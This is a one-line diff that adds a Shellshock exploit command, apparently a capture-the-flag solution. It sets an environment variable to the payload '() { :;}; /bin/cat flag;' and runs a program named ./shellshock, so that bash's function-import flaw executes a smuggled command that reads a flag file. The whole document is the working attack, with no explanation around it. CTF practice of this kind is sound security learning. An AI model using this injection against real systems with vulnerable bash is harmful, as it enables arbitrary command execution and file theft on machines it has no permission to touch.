@@ -1,0 +1,1 @@
+env ss="() { :;}; /bin/cat flag;"   ./shellshock
